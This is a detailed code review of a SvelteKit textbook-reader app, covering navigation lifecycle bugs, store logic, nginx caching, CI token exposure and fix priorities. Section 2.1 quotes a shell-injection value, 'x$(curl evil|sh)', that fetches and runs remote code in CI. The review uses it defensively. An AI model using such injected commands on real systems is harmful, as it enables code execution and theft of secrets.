# Codebase Review — June 2026

**Scope:** Full review of `src/` (stores, utils, actions, workers, components, routes), `scripts/`, CI workflow, and server/build configuration.
**Method:** Five parallel manual file-by-file audits plus tooling passes.
**Tooling baseline (all clean):** `svelte-check` 0 errors across 829 files, ESLint 0 errors, `npm audit` 0 vulnerabilities, all 353 unit tests pass. Everything below was found by manual review — none of it is caught by the current tooling or test suite.

Severity legend: **High** = user-visible feature breakage or meaningful security exposure. **Medium** = real bug or risk, narrower impact or latent. **Low** = quality, dead code, drift risk, minor correctness.

---

## 1. High — broken features

### 1.1 Per-section lifecycle never re-runs on section→section navigation

`src/routes/[bookSlug]/kafli/[chapterSlug]/[sectionSlug]/+page.svelte:79-103,116-119`

All per-section setup lives in `onMount`/`onDestroy`, but SvelteKit **reuses** the page component when only params change (which is exactly what the prev/next buttons do). There is no `{#key data.sectionSlug}` wrapper and no `afterNavigate` handling. After reading section 1‑1 and clicking "next":

- `reader.setCurrentLocation()` never fires again — "continue where you left off" and the study session's `currentChapter` input stay stuck on the first section.
- `analyticsStore.startReadingSession()`/`endReadingSession()` never fire again — **all** reading time is attributed to the first section visited per page load.
- The continue-reading prompt and scroll reset never fire for subsequent sections.

The book layout already does this correctly with a `$page`-driven `$effect` (`[bookSlug]/+layout.svelte:24-31`). Fix: move per-section logic into `afterNavigate`/`$effect` keyed on the slug, or wrap the page in `{#key}`.

The same component-reuse issue independently breaks four actions/components (each also needs its own fix, since they have `update()` paths that are buggy or missing):

- **Read detection breaks after the first section** — `src/lib/actions/readDetection.ts:40,63,92-95`. `setup()` reads `enabled` from mount-time options, and `hasTriggered` is never reset in `update()`, so after one section fires `onRead`, every subsequent section tears down the observer and is never auto-marked read.
- **Saved highlights only restored on mount** — `src/lib/components/TextHighlighter.svelte:52-62`. `restoreHighlights()` runs once in `onMount`; annotations for any subsequently visited section don't render until a hard reload. `restoredHighlights` (line 49) also accumulates detached `<mark>` nodes forever and is never read — dead state.
- **Bionic reading silently stops working** — `src/lib/actions/bionicReading.ts:171,216-228`. `data-bionic-processed` is set on the **container** and never cleared, so `shouldSkipElement` rejects every text node of subsequently loaded sections.
- **Equations and lazy images only enhanced once** — `src/lib/actions/equations.ts:207`, `src/lib/actions/lazyImages.ts`. Neither has an `update()` or MutationObserver (unlike practiceProblems/answerLinks/glossaryTerms), so copy/zoom buttons and lazy loading are missing on every section after the first.

### 1.2 Selection popup and glossary tooltip positioned off-screen when scrolled

`src/lib/components/TextHighlighter.svelte:288`, `SelectionPopup.svelte:31-33,68-69`, `GlossaryTooltip.svelte:21-24,58-59`

`handleMouseUp` computes `y: rect.top + window.scrollY` (document coordinates) but both popups render with `position: fixed` and use that value as `top`. Any selection made after scrolling N pixels places the popup N pixels below the viewport — the highlight/annotate UI is effectively unreachable except near the top of the page. Fix: use `rect.top` (viewport coords) for fixed positioning.

### 1.3 Toggling bionic reading off bricks practice-problem buttons

`src/lib/actions/bionicReading.ts:177-180` + `src/lib/actions/practiceProblems.ts:19-20`

Toggle-off restores an innerHTML snapshot taken _after_ practiceProblems enhanced the DOM. The restored markup still carries `data-initialized="true"` and the injected buttons, but all event listeners are gone — "Sýna svar"/hint buttons render and do nothing. The re-fired MutationObserver skips anything with `data-initialized`. (The ordering comment in `ContentRenderer.svelte:45-51` claims this is safe; it is wrong for per-element-listener actions.) Related: `answerLinks.ts:230-336` re-inserts a **second** exercise number link after the same toggle, because the restored snapshot contains untracked anchors and there's no "already has link" guard.

### 1.4 Adaptive quiz / practice tracking pipeline is inert — the feature can never have data

`src/lib/stores/quiz.ts:305,355`

`markPracticeProblemViewed` is the only writer that creates `practiceProblemProgress` entries, and it is called **only from tests** (verified across all of `src/`). `markPracticeProblemAttempt` silently no-ops when no entry exists. Consequently `getAdaptiveProblems`/`getProblemsForReview` always return `[]`: the `/prof` adaptive quiz, `study/PracticePhase.svelte`, and `study/ReviewPhase.svelte` never have problems to show, and mastery never accumulates. The DOM action `actions/practiceProblems.ts` manages its own state and never touches the store — the wiring was apparently lost in the React→Svelte migration.

### 1.5 Glossary store never loads a second book's glossary

`src/lib/stores/glossary.ts:46-48,67`

`loadPromise` is only reset on **error** (or `clear()`, which nothing calls). After book A's glossary loads successfully, `load(bookB)` returns A's stale resolved promise — book B's tooltips and glossary lookups serve book A's terms. Fix: clear `loadPromise` after success and key the cache on the requested slug.

### 1.6 Stale persisted analytics session can inflate reading time by days

`src/lib/stores/analytics.ts:186,272-279`

`currentSession` is persisted with the rest of the state. If the tab is killed mid-session, the dangling session is restored on next visit and "ended" with `durationSeconds = now - startTime` — potentially days — flowing into `sectionReadingTimes`, `dailyStats`, and `hourlyReadingData`. There is a 5-second minimum but no maximum cap and no staleness check. Fix: exclude `currentSession` from persistence (as `offline.ts:71-74` does for `currentDownload`) or discard/cap stale sessions on load.

### 1.7 Study session planner: phase toggles are dead UI

`src/lib/components/study/SessionPlanner.svelte:21-26,44`

`phaseToggles` is a `$derived` object literal and `togglePhase()` mutates a property on it. Property mutation of a derived's plain object doesn't notify the signal, so clicking a phase card neither updates the UI nor changes which phases the session starts with. Fix: reassign (`phaseToggles = { ...phaseToggles, [id]: !phaseToggles[id] }`) — or make it `$state` synced from the derived input.

### 1.8 Ctrl+Enter in the flashcard modal creates duplicate cards (and decks)

`src/lib/components/FlashcardModal.svelte:117,131`

`handleKeyDown` is registered both as a `document` listener in `onMount` and as `onkeydown` on the overlay div, so Ctrl+Enter runs `handleSave()` twice: two cards with distinct ids — and if "new deck" is open, two decks with one card each. `NoteModal.svelte:76,88` has the identical double registration (currently masked by a guard in the parent).

### 1.9 `$derived` over `get()`-based store methods — stats and lists frozen forever

One root cause, three user-visible breakages. Store methods like `getAllGoalsProgress()` read state via `get({ subscribe })`, so a `$derived(...)` wrapping them registers **zero** dependencies and computes exactly once:

- **Goals list never refreshes** — `src/lib/components/analytics/GoalsTab.svelte:87`. Adding/removing/toggling a goal does nothing visible until remount (the imported reactive `activeGoals` store on line 5 is unused — that's the fix).
- **Keyboard shortcuts modal permanently stale** — `src/lib/components/KeyboardShortcutsModal.svelte:28-29`. After rebinding a key, the displayed binding, "customized" styling, and per-row reset buttons never update (the modal is mounted persistently in the book layout).
- **Analytics page cards frozen** — `src/routes/[bookSlug]/greining/+page.svelte:176-178`. `recentActivity`/`totalReadingTime`/`weeklyStats` never recompute; "Hreinsa gögn" clears the chart but leaves these cards showing deleted data.

Worth a project-wide sweep: any `$derived(storeObject.method())` where the method uses `get()` internally has this bug.

### 1.10 nginx: unhashed assets cached as immutable for a year

`nginx-config-example.conf:97-107`

The extension-based cache block applies `expires 1y; Cache-Control "public, immutable"` to **everything**, not just SvelteKit's hashed `/_app/` bundles. That includes `/styles/content.css` and `/styles/print.css` (linked with plain hrefs, no cache-busting — the cross-repo CSS contract stylesheet will be stale for up to a year after a deploy) and all `/content/`, `/covers/`, `/icons/` images (synced content images keep stable filenames, so corrected figures never reach returning browsers; compounded by the service worker's 30-day CacheFirst for content images). Fix: scope `immutable` to `^/_app/`, give unhashed assets `must-revalidate` semantics like the content JSON/HTML blocks already have.

---

## 2. Security

No exploitable XSS was found: every `innerHTML`/`{@html}` sink fed by fetch-derived or user-selected text goes through `escapeHtml` (verified: glossary tooltip, cross-ref tooltip, figure lightbox, search highlighting — which escapes both text and query before regex construction). Prototype pollution via tampered localStorage is blocked by `validateStoreData` copying only known keys. Raw `{@html}` of book content is the documented, intentional trust model. Remaining findings:

### 2.1 Shell injection via book slug in `sync-content.js` (runs in CI) — Medium

`scripts/sync-content.js:198,249`

``execSync(`node scripts/generate-toc.js ${bookSlug}`)`` interpolates a directory name taken from the **content repo** listing into a shell string; validation only checks the name exists in that same listing. A directory named `x$(curl evil|sh)` in `namsbokasafn-efni/books/` executes in CI (`ci.yml:38`) where `EFNI_TOKEN` is present — anyone with write access to the content repo gets code execution here. Fix: `execFileSync('node', ['scripts/generate-toc.js', bookSlug])`.

### 2.2 `EFNI_TOKEN` PAT persisted into the workspace during PR builds — Medium

`.github/workflows/ci.yml:22-30,65-73`

`actions/checkout` defaults to `persist-credentials: true`, writing the PAT into `namsbokasafn-efni/.git/config`, readable by subsequent PR-controlled steps (`npm ci` lifecycle scripts, vite config, e2e). The trigger is plain `pull_request`, so fork PRs get no secret — exposure is limited to same-repo branches — but `persist-credentials: false` on the content checkout closes it cleanly. (Positive: all actions are SHA-pinned.)

### 2.3 CSP hardening gaps — Low

`nginx-config-example.conf:84`: `img-src ... https:` allows images from any HTTPS origin; `object-src`, `base-uri`, `frame-ancestors`, `form-action` are absent. Adding `object-src 'none'; base-uri 'self'; frame-ancestors 'none'` is free. (`script-src 'unsafe-inline'` is hard to avoid with adapter-static — acceptable.)

### 2.4 `sync-content.js` prunes destination books with no safeguard — Medium (data-loss, recoverable)

`scripts/sync-content.js:352-371`

After syncing, any directory under `static/content/` not present in the source is recursively deleted — even on a single-book sync and even when some books failed. Pointing `--source` at a partial checkout silently deletes every other book's content (regenerable, but surprising). Make pruning an explicit `--prune` flag. _(Carried over from the Feb 2026 audit's top-5 list — still open.)_

---

## 3. Medium

### Stores / data integrity

- **M1. `migrateRecordKeys` corrupts current-format quiz stats keys** — `src/lib/utils/storeHelpers.ts:168-172` treats any key with <2 slashes as legacy, but `createStatsKey` legitimately produces 1-slash keys (`"<book>/global"`, `"<book>/<chapter>"`); `quiz.ts:137` runs the migration on every load, turning `efnafraedi-2e/global` into `efnafraedi-2e/efnafraedi-2e/global`. Latent only because the quiz-session flow is test-only today (see 1.4). The same migration is safe for reader/analytics/objectives keys (≥2 slashes, verified).
- **M2. Quiz answer dedupe keyed on answer-option id, not question id** — `src/lib/stores/quiz.ts:202-215`. Re-answering a question with a different choice appends instead of replacing, corrupting the score. Tests mask it by using question ids as answer ids.
- **M3. Cross-book data collisions** — `PracticeProblem` and `ObjectiveProgress` records store `chapterSlug` without `bookSlug` (`quiz.ts:32-42`, `objectives.ts:25-34`), and the chapter/section-level getters filter by chapter slug only (`quiz.ts:461-566`, `objectives.ts:186-258`). v2 chapter slugs are zero-padded numbers shared by all books, so progress bleeds across books. User-visible today on `/markmid`: `src/routes/[bookSlug]/markmid/+page.svelte:65,94,205-208` iterates all completed objectives with no book filter and links them into the **current** book's routes (wrong book / 404).
- **M4. Objectives chapter/overall progress is always 100%** — `src/lib/stores/objectives.ts:122-143,186-203`. Entries are only created with `isCompleted: true` and un-completing deletes the entry, so the denominator always equals the completed count.
- **M5. Cross-tab sync clobbers transient session state** — `flashcard.ts` (`currentDeckId`, `currentCardIndex`, `studyQueue`), `quiz.ts` (`currentSession`), `analytics.ts` (`currentSession`) are all synced across tabs wholesale; a second open tab yanks the first tab's study position and can double-end reading sessions. `offline.ts:71-74` shows the right pattern (persist a subset).
- **M6. `getSectionMastery` mixes aggregation strategies** — `src/lib/stores/quiz.ts:424`. Level uses `Math.min` of per-problem attempts while successRate/attempts use totals; one merely-viewed problem pins a section at novice.
- **M7. UTC/local date mismatch in analytics** — `analytics.ts:294,393-395` compares a UTC ISO prefix against a local date for "sections visited today"; `greining/+page.svelte` `getLast7Days` builds UTC keys while the rest of the layer uses local dates. Invisible in Iceland (UTC year-round); wrong everywhere else.

### Search

- **M8. Worker message races** — `src/lib/utils/searchIndex.ts:105-115,238-254` + `src/lib/workers/search.types.ts:40-43`. The protocol has no request ids; `search()` swaps `worker.onmessage` per call and a timeout never restores it, so overlapping searches resolve each other's promises and a timeout permanently hijacks routing. Same class of bug in `buildIndex` (an in-flight build for book A is returned to a request for book B). The 200 ms debounce reduces but doesn't eliminate it. Fix in the protocol: add an `id` echoed by the worker.

### Components / routes

- **M9. Search chapter filter doesn't trigger a search** — `src/lib/components/SearchModal.svelte:103-110,120-123`. The debounced `$effect` tracks only `query`/`toc`/`bookSlug`; `selectedChapter` is read inside an untracked `setTimeout`, so changing the filter does nothing until the query text changes.
- **M10. Shortcut rebinding: Escape gets captured as the new binding** — `src/lib/components/KeyboardShortcutsModal.svelte:49-98`. There is no cancel path while editing; pressing Escape binds Escape. The 300 ms save timeouts are also never cleared. Related: `src/lib/actions/keyboardShortcuts.ts:321-329` only ever _starts_ a two-key sequence on a literal `g`, so a custom binding like `b h` validates but can never fire.
- **M11. Visible desktop sidebar is `aria-hidden` with focusable links** — `src/lib/components/layout/Sidebar.svelte:113` + CSS `:524-531`. `sidebarOpen` defaults to false but CSS forces the sidebar visible on ≥1024px, so the whole TOC is keyboard-focusable yet hidden from the accessibility tree (WAI-ARIA violation).
- **M12. Pomodoro timer counts ticks, not time** — `src/lib/components/PomodoroTimer.svelte:39-47`. Background-tab interval throttling (down to 1/min) means a 25-minute pomodoro can take hours of wall time — the primary use case is reading in another tab. Compute remaining time from a timestamp instead.
- **M13. AnnotationSidebar can't be dismissed by keyboard** — `src/lib/components/AnnotationSidebar.svelte:104-121`. The only Escape handler is on a `tabindex="-1"` backdrop that never has focus; the `role="dialog"` panel has no keydown handling, focus trap, or initial focus.
- **M14. PeriodicTable modal swallows keyboard nav** — `src/lib/components/PeriodicTable.svelte:272`. `onkeydown={(e) => e.stopPropagation()}` on the modal div kills Escape and arrow-key handling whenever focus is inside the modal.
- **M15. Mangled ASCII pseudo-Icelandic UI text** — diacritics stripped wholesale on the quiz surfaces: `src/routes/[bookSlug]/prof/+page.svelte:36-43,60-66` ("Adlogunarprof", "thinum framforum"…), `src/lib/components/AdaptiveQuiz.svelte` (~15 strings), `NoteModal.svelte:108-185`, `AnnotationSidebar.svelte:99,204,234,244`. Violates the project's Icelandic-UI policy; reads as broken to users.
- **M16. Book home page prerenders only skeletons + duplicate TOC fetch** — `src/routes/[bookSlug]/+page.svelte:25-40` fetches the chapter grid client-side in `onMount` with global `fetch`, although the route is prerendered and the layout load already fetched the same `toc.json`. Move into `+page.ts`.
- **M17. `yfirlit` chapter selection race** — `src/routes/[bookSlug]/yfirlit/+page.svelte:60-108`. Long sequential fetch loop with no cancellation token; clicking another chip mid-load can leave the previous chapter's content displayed under the new chip.
- **M18. Hardcoded chemistry metadata on generic routes** — `[bookSlug]/+page.svelte:59,63`, `kafli/.../+page.svelte:66`, section page `:181,185` emit "OpenStax Chemistry 2e"/"Efnafræði kennslubók" SEO descriptions for every book, including biology/physics.
- **M19. `/feedback` and `/for-teachers` not prerendered** — no `prerender` export, so fully static pages are served via the SPA fallback only. One-line fix each.
- **M20. Glossary tooltip stranded on navigation** — `src/lib/actions/glossaryTerms.ts:447-449`. `teardown()` only hides the tooltip if `currentSpan` is still inside the node; when content is replaced while a tooltip is open it stays on screen with `pointer-events: auto`. The crossReferences preview tooltip has the same stranding (cosmetic — it keeps `pointer-events: none`), `crossReferences.ts:198-212,244-260`.

### Scripts

- **M21. `setup-goaccess.sh` word-splitting bug** — `scripts/setup-goaccess.sh:130-161`. Building the command as a string makes the quoted Icelandic title split into separate args including a stray `-`, which tells goaccess to read stdin — the plain-logs branch hangs. Use a bash array. (`find_logs()` also ignores its `days` arg, `:74-75`.)
- **M22. `check-status.mjs` reports success on every failure** — `scripts/check-status.mjs:25-31,73-114`. `run()` swallows all exceptions, so TS/ESLint/Prettier checks always print ✅, `npm outdated` failures report "all up to date", and audit failures stay "unknown". Also dead wiring: the advertised `npm run check:status` doesn't exist. Delete or rewrite.

---

## 4. Low / code quality

### Dead code and stale artifacts

- `scripts/place` — 2-byte junk file; accidental commit.
- `scripts/test-offline.js` — uses `chapter.slug` (absent in v2 TOCs → every URL is `chapters/undefined/...`) and markdown-era logic; can only fail. Dead.
- `scripts/generate-audio.ts` — globs `**/*.md`; content is HTML-only. Dead.
- `static/manifest.json` — dead duplicate; the layout links the VitePWA-generated `/manifest.webmanifest`, and the static copy has diverged values.
- `tailwind.config.js` — inert under Tailwind 4 (`app.css` uses `@import "tailwindcss"` with no `@config`); its `content` globs and `fontFamily` extensions are ignored.
- `src/lib/stores/reference.ts:207-355` — `buildIndexFromContent` parses markdown syntax that no longer exists in content; `registerReference` has no callers and doesn't dedupe.
- `src/lib/components/ContentRenderer.svelte:27,40-43` — `error` is never set; the error branch is dead.
- Dead types: `DeckStats` (`types/flashcard.ts:48`) and `QuizSession` (`types/quiz.ts:22`) are shadowed by incompatible store-local definitions. `DIFFICULTY_TO_QUALITY` (`types/flashcard.ts:29`) duplicates `RATING_TO_QUALITY` (`utils/srs.ts:26`) — drift risk.
- Unused imports: section page (`getSavedScrollPosition`, `ScrollPositions`, `fade`), `for-teachers` (`settings`), `GlossaryTooltip`/`SelectionPopup` (`fade`). `equations.ts:7,247` `state.copyTimeout` declared/cleared but never assigned. `practiceProblems.ts:39` `problemId` computed and never used. `crossReferences.ts:126` `_tooltipRect` forces layout then goes unused.
- `+error.svelte:18` guards against a removed `demo` route while not excluding real non-book roots (`feedback`, `print`), so the offline branch can offer a bogus "Fara í bók → /feedback" link.
- `scripts/process-content.js:1-17` — header documents gray-matter parsing and a cross-reference index; neither is implemented.
- `src/lib/config.ts:11-16` — comment claims dev defaults to `localhost:3000`; code defaults to `''`.

### Duplication (drift risk)

- The modal focus trap is copy-pasted five times (KeyboardShortcutsModal, SettingsModal, SearchModal, NoteModal, FlashcardModal) — and NoteModal/FlashcardModal already drifted into the double-handler bug (1.8). Extract a shared action.
- TOC-load-in-`onMount` copy-pasted 6× across `ordabok`, `bokamerki`, `greining`, `markmid`, `nam`, `yfirlit`, each with slightly different error handling.
- `analytics.ts` `startReadingSession` inlines ~70 lines of `endReadingSession`; `getGoalProgress`/`getAllGoalsProgress` are near-copies; `flashcard.ts` duplicates `getFlashcardStatsForPeriod` vs `weeklyFlashcardStats`.
- The tooltip singleton in `crossReferences.ts` is ~80% copied from `glossaryTerms.ts`.
- Build scripts: page-data extraction, chapter-folder helpers, and book enumeration each implemented 3-5 times across `scripts/`; v1-slug support exists in `process-content`/`validate-content` but not `generate-sitemap`/`generate-pdfs`. A `scripts/lib/` module would fix the class.

### Correctness nits

- **SRS:** ease factor has no upper clamp (`utils/srs.ts:36-43`) — every "easy" adds +0.1 unboundedly, contradicting the documented 1.3–2.5 range; `srs.test.ts:36-37` codifies the deviation. Decide which is right and align code/docs/test.
- `utils/localStorage.ts:50` — full localStorage scan on every `safeSetItem` (per-scroll-event cost); `:85` — cross-tab sync ignores deletions (`newValue` null).
- `utils/textAnchor.ts` — v2 anchor fields (`anchorId`, `offsetFromAnchor`) are stored but never used by `deserializeRange`; `calculateSimilarity` compares positionally and misaligns truncated prefixes.
- `reader.ts` — `scrollPositions` grow unboundedly; the `percentage < 5` early-return leaves a stale deep position when the user scrolls back to the top.
- `quiz.ts:583` — `isComplete` is true when _on_ the last question, not when it's answered. `flashcard.ts` `todayStudied` doesn't roll over at midnight until the first rating.
- `searchIndex.ts:218-222` — the no-worker fallback logs "building on main thread", builds nothing, sets `isReady = true`, and searches return `[]` silently. `:160-187` — index build fetches every section serially. Worker keeps full raw HTML alongside `plainText` (~2× memory, `search.worker.ts:67-79`); entity decoding replaces `&amp;` first (double-decode, `:44-49`); `normalizeText` drops ð/þ/æ via ASCII `\w` (`:105-113`, inflates match counts only — Fuse itself uses un-normalized text).
- `figureViewer.ts:46` — `escapeHtml` inside `setAttribute` (screen readers hear `&amp;` literally); `:364-369` — `img.width > 100` at mount is 0 for lazy images, so the zoom cursor rarely applies; `:264-272` — after a pinch ends with one finger down, panning is stuck until all fingers lift.
- `glossaryTerms.ts:34` — `MIN_TERM_LENGTH = 3` now only causes false negatives (e.g. "pH") since the text-matching pass was removed; `:259-262` — a concurrent `init()` during a slow load is dropped without retry.
- `TextHighlighter.svelte:207-252` — element-node range boundaries over-highlight (triple-click selections), mitigated by the `surroundContents` fast path; `:448` — `mouseup`-only capture means touch/keyboard selection can never annotate.
- `MobileBottomNav.svelte:169` — `aria-controls="fab-menu"` references a nonexistent id; backdrop closes on any key.
- `ErrorMessage.svelte:26-27,57-59` — `navigator.onLine` read once, no listeners, and offline state overrides unrelated error messages.
- `Sidebar.svelte:40-59` — a manually expanded chapter renders collapsed when the user then navigates into it (manual-toggle set never pruned).
- `PWAUpdater.svelte:59-70` — store subscriptions never unsubscribed (root-layout singleton, minimal impact).
- `ordabok/+page.svelte:51` — `t.term[0]` throws on an empty term (sibling page uses `?.`).
- `greining/+page.svelte:401` — percent guard uses the chart's `maxSeconds` instead of the entry's own → possible `NaN%` width.
- `generate-sitemap.js:108` — emits `/svarlykill/N` for every chapter instead of iterating `toc.answerKey`; only script using cwd-relative paths; omits `/vidauki` and `/svarlykill` index pages.
- `generate-toc.js:237` — the trailing-comma regex can corrupt JSON string values containing `,}`/`,]`; `:183-185` inconsistent comparator for dual intro files; `:348` `isInteractive === 'true'` string-compare likely never fires against boolean page-data.
- `annotate-glossary-terms.js:255,272-274` — term interpolated unescaped into an HTML attribute; `String.replace` with an unescaped replacement (a `$&` in a definition would corrupt output); edits gitignored synced content that the next sync reverts.
- `generate-pdfs.js:83` — `parseInt` of `--port` unvalidated (`NaN`); `:253` deletes `toc-pages.json` before regenerating, so a failed run leaves `static/downloads/` incomplete.
- nginx: old-slug 301 redirects (`:136-141`) are regex locations placed _after_ the static-asset regex block, so asset URLs under `/content/efnafraedi/` 404 instead of redirecting.

### Consistency / i18n nits

- Tab id `'markmiđ'` uses đ (U+0111, Croatian d-stroke) instead of ð — consistent across `AnalyticsTabs.svelte:5,15` and `greining/+page.svelte:440-447` so it works, but it's a landmine for any future comparison typed with real ð.
- Icelandic grammar: "yfirstrikunar" as plural (`AnnotationSidebar.svelte:364`, should be "yfirstrikanir"), "skrár vantaðar" (`DownloadBookButton.svelte:182`, should be "skrár vantar"), nominative "stokkur" where accusative "stokk" is needed (`FlashcardModal.svelte:209-252`).
- Canonical/og:url omit the trailing slash everywhere while `trailingSlash = 'always'` — canonicals point at the redirecting variant.
- Two different contact emails: `namsbokasafn@gmail.com` (feedback, for-teachers) vs `sigurdur@namsbokasafn.is` (landing, FAQ).
- `apple-touch-icon` points to an SVG (iOS ignores it; a PNG exists at `static/icons/icon-192.png`).
- `for-teachers` hardcodes chapter status (1-4 translated) and unpadded deep links (`/kafli/1` vs canonical `/kafli/01/`) against the dynamic-TOC convention.
- `svarlykill/[chapter]/+page.svelte:51` hardcodes the `N-exercises` filename convention instead of reading the TOC.
- `crossReferences.ts:99-104` hardcodes a green accent and `PomodoroTimer.svelte:362-368` a blue pulse ring, contrary to the amber accent convention.
- `loadSectionContent` never sets `type` on the returned section, so `sectionType` is always `''` (works only via answerLinks' slug-sniffing fallback).
- Doc drift: CLAUDE.md says TS 5.7/Vite 7 (package has TS ^6/Vite ^8) and "deployed via GitHub Actions" (no deploy workflow exists in this repo).
- E2E: 42 `waitForTimeout` hard sleeps and pervasive silent `test.skip()` fallbacks mean regressions can pass as "skipped"; the CI e2e job builds the site twice (`build:no-validate` then Playwright's `webServer` runs `npm run build` again).

---

## 5. Verified non-issues

Checked and confirmed fine — no need to re-investigate:

- **XSS:** `escapeHtml` ordering correct (`&` first); search highlighting escapes text and query pre-regex; figure lightbox/glossary/cross-ref tooltips all escape; generated hrefs use `encodeURIComponent`; no `{@html}` of query params or user input anywhere; PDF manifest filenames validated against a strict regex.
- **Prototype pollution:** `validateStoreData` copies only keys present in defaults.
- **SM-2 core:** rating map, interval ladder (1 → 6 → round(I×EF), 365 cap), 1.3 floor, failure reset all correct; previews match actual behavior. (Only the missing upper ease clamp deviates — see above.)
- **Cross-tab `_externalUpdate` echo suppression:** safe (synchronous store subscriptions).
- **CI:** plain `pull_request` trigger (fork PRs get no secrets); all actions SHA-pinned; `npm audit --audit-level=high` runs in CI.
- Module-level singletons (search worker, storage listeners, glossary tooltip) are intentional and bounded, not leaks.
- `offline.removeBook` cache-key matching includes a trailing slash — `efnafraedi` can't match `efnafraedi-2e`.
- Date/streak helpers (`formatLocalDate`, week/month boundaries, streak logic) are correct in local time.

---

## 6. Suggested fix order

1. **1.1 + 1.2** — section-navigation lifecycle and popup coordinates: small fixes, restore the core reading/annotation experience.
2. **2.1 + 2.2** — `execFileSync` in sync-content and `persist-credentials: false` in CI: two-line security fixes.
3. **1.9** — sweep `$derived` over `get()`-based methods (three known instances).
4. **1.5, 1.6, 1.7, 1.8** — one-or-few-line store/component fixes.
5. **1.10 + 2.3** — nginx cache scoping and CSP additions (server-side, coordinate with deploy).
6. **M15 / Icelandic text** — restore proper diacritics on quiz/note/annotation surfaces (mechanical but user-facing).
7. **1.4 + M1-M4** — decide whether to wire up or remove the practice-tracking/objectives-progress pipeline; fixing its latent bugs only matters if it's wired.
8. Dead-code removal and the duplication extractions as cleanup PRs.
